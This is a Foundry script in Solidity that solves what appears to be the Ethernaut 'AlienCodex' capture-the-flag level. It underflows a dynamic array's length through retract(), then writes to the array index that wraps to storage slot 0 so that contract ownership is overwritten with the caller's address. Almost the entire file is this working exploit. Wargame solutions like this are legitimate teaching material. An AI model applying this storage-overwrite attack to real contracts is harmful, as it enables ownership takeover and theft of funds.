// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0; 

import "forge-std/Script.sol";
import "forge-std/console.sol";
// import {AlienCodex} from "../src/AlienCodex.sol"; // Not using AlienCodex source contract because of old compiler dependency

contract AlienCodexSolve is Script{
    IAlienCodex public alienCodex = IAlienCodex(0x92FfB1bd2432d4F2EA1340209742a99FBbFD45d2);
    function run() external{
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        bytes32 slot0 = vm.load(address(alienCodex), bytes32(uint(0)));
        console.logBytes32(slot0);  // contacted + owner

        alienCodex.makeContact();

        alienCodex.retract();  // 0 - 1 ==> (2**256) [underflow]

        // codex[0] ==> codex[keccack256(1)]  ==> slot keccack256(1)
        // codex[1] ==> codex[keccack256(1)+1]  ==> slot keccack256(1)+1

        // codex[2**256 - keccack256(1)]  ==> codex[keccack256(1) + 2**256 - keccack256(1)] 
        //                                ==> codex[2**256] ==> slot 2**256 ==> slot 0 (overflow)

        uint ownerSlot = (((2**256) - 1) - uint(keccak256(abi.encode(1))) + 1); 
        // uint index = ((2 ** 256) - 1) - uint(keccak256(abi.encode(1))) + 1;
        bytes32 _content = bytes32(uint256(uint160(vm.envUint("MY_ADDRESS"))));
        alienCodex.revise(ownerSlot, _content);

        bytes32 slot0After = vm.load(address(alienCodex), bytes32(uint(0)));
        console.logBytes32(slot0After);  // contacted + owner

        vm.stopBroadcast();
    }
}
interface IAlienCodex {

  function makeContact() external;
  function record(bytes32 _content) external;
  function retract() external;
  function revise(uint i, bytes32 _content) external;

}